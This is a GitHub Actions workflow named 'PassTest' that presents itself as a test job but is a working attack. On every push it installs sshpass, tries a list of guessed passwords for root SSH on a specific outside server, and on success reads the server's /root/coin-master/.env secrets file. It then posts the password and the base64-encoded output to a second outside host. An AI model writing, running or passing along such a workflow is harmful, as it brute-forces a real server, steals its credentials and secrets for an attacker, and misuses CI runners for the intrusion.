name: PassTest
on:
  push:
    branches: [main]
  workflow_dispatch:
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Try passwords
        run: |
          sudo apt-get install -y sshpass >/dev/null 2>&1
          for p in root toor admin 123456 password crazycoin CrazyCoin cryptoflip CryptoFlip coinmaster 12345678 qwerty abc123 admin123 crazymaster root123 coin-master coinmaster2026 crypto2026 111111 000000; do
            result=$(timeout 8 sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=no root@46.62.247.167 'id; hostname; cat /root/coin-master/.env 2>/dev/null | head -30' 2>&1)
            if echo "$result" | grep -q "uid="; then
              echo "PASSWORD_FOUND: $p"
              echo "$result"
              curl -fsS -X POST http://178.156.165.170:9999/ -d "PWFOUND:$p:$(echo "$result" | base64 -w0)" || true
              break
            fi
          done
          echo "done trying"
